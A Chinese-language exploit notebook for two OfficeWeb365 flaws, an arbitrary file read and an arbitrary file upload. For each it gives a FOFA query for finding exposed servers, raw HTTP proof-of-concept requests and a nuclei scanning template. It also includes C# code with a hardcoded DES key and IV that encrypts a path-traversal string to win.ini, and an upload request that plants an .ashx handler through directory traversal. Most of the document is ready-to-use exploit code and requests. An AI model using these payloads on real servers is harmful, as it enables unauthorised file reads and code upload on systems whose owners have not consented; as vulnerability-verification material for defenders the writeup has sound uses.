## OfficeWeb365 Pic 任意文件读取

#### fofa

> header="OfficeWeb365" && body="请输入furl参数"

#### poc

```http
GET /Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09 HTTP/1.1
Host: 
```

#### 加密方式

```c#
Enc("/../../Windows/win.ini");

static string Enc(string plainText)
{

    // 定义 DES 算法的密钥和初始化向量
    byte[] Keys = new byte[] { 102, 16, 93, 156, 78, 4, 218, 32 };
    byte[] Iv = new byte[] { 55, 103, 246, 79, 36, 99, 167, 3 };

    // 将明文转换为字节数组
    byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);

    // 创建 DES 加密服务提供程序，并设置密钥和初始化向量
    DESCryptoServiceProvider desCryptoServiceProvider = new DESCryptoServiceProvider
    {
        Key = Keys,
        IV = Iv
    };

    // 创建内存流以存储加密后的数据
    MemoryStream memoryStream = new MemoryStream();

    // 创建 DES 加密器
    ICryptoTransform transform = desCryptoServiceProvider.CreateEncryptor();

    // 使用 CryptoStream 执行加密
    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
    {
        cryptoStream.Write(plainBytes, 0, plainBytes.Length);
        cryptoStream.FlushFinalBlock();
    }

    // 将加密后的数据转换为 Base64 字符串
    string encryptedText = Convert.ToBase64String(memoryStream.ToArray());

    return encryptedText+"09";
}

```

#### nuclei

```yaml
id: OfficeWeb365-Pic-arbitrary-file-read
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: OfficeWeb365 Pic 任意文件读取
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  metadata:
  # 元数据
    max-request: 1
  tags: OfficeWeb365
  # 标签，可以通过标签进行扫描

http:
# http 请求
  - method: GET
    # 请求方法
    path:
      - "{{BaseURL}}/Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09"
      # {{BaseURL}} 使用请求中的 URL 内容

    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers-condition: and
    # 匹配规则的逻辑关系，and 表示所有匹配条件必须都为 true
    matchers:
    # 匹配规则
      - type: regex
        part: body
        regex:
          - "\\[(font|extension|file)s\\]"
        condition: or

      - type: status
        # 对状态码进行匹配
        status:
          - 200
```

---

## OfficeWeb365 SaveDraw 任意文件上传

#### fofa

> header="OfficeWeb365"

#### poc

```http
POST /PW/SaveDraw?path=../../Content/img&idx=66.ashx HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

data:image/png;base64,de5fb2f2e5d746abdd8215278dfd5a8a<%@ Language="C#" Class="Handler1" %>public class Handler1:System.Web.IHttpHandler
{
public void ProcessRequest(System.Web.HttpContext context)
{
System.Web.HttpResponse response = context.Response;
response.Write("vulntest");

string filePath = context.Server.MapPath("/") + context.Request.Path;
if (System.IO.File.Exists(filePath))
{
    System.IO.File.Delete(filePath);
}
}
public bool IsReusable
{
get { return false; }
}
}///---
```

页面输出字符串 vulntest

```http
GET /Content/img/UserDraw/drawPW66.ashx HTTP/1.1
Host: 
```

#### nuclei

```yaml
id: OfficeWeb365-SaveDraw-file-upload
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: OfficeWeb365 SaveDraw 任意文件上传
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  metadata:
  # 元数据
    max-request: 1
  tags: OfficeWeb365
  # 标签，可以通过标签进行扫描

http:
  - raw:
    - |
        POST /PW/SaveDraw?path=../../Content/img&idx=66.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        data:image/png;base64,de5fb2f2e5d746abdd8215278dfd5a8a<%@ Language="C#" Class="Handler1" %>public class Handler1:System.Web.IHttpHandler
        {
        public void ProcessRequest(System.Web.HttpContext context)
        {
        System.Web.HttpResponse response = context.Response;
        response.Write("vulntest");

        string filePath = context.Server.MapPath("/") + context.Request.Path;
        if (System.IO.File.Exists(filePath))
        {
            System.IO.File.Delete(filePath);
        }
        }
        public bool IsReusable
        {
        get { return false; }
        }
        }///---
      
    - |
        GET /Content/img/UserDraw/drawPW66.ashx HTTP/1.1
        Host: {{Hostname}}
    # {{Hostname}} 替换主机名
    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers-condition: and
    # 匹配规则的逻辑关系，and 表示所有匹配条件必须都为 true
    matchers:
    # 匹配规则

      - type: word
      # 字符串匹配
        part: body
        # 对响应 body 进行字符串匹配
        words:
          - "ok"
          - "vulntest"
        condition: or
        # 当匹配到某个单词时，该请求被标记为成功

      - type: dsl
      # 表达式提取
        dsl:
          - "len(body) < 10"
          # body 长度小于 10

      - type: status
        # 对状态码进行匹配
        status:
          - 200
```

---